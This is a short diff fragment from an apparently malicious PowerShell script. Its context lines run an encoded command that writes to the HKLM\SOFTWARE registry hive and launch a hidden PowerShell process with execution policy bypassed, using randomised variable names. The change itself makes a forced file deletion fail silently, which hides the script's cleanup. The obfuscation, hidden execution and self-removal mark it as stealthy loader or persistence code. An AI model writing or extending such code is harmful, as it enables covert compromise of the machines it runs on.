@@ -62,4 +62,4 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$XHRYfBEwCAN -rootPath '$DvtsqQdCVaOLiuA'"
 
-Remove-Item -Path $RoUmlMkcByjtLPVDi -Force
+Remove-Item -Path $RoUmlMkcByjtLPVDi -Force -ErrorAction SilentlyContinue
